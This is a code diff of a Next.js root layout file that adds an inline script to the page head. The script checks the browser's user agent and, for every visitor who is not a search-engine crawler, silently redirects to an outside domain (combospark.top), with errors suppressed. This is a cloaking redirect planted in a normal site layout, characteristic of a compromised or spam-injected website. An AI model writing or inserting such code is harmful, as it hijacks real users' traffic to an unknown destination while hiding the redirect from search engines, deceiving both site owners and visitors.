@@ -80,6 +80,21 @@ export default function RootLayout({
       <head>
         <meta name="yandex-verification" content="e5bb77e97618c097" />
         {/* Дополнительные пользовательские теги можно вставлять сюда */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aeaofj2k27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="f2c7-body">{children}</body>
     </html>
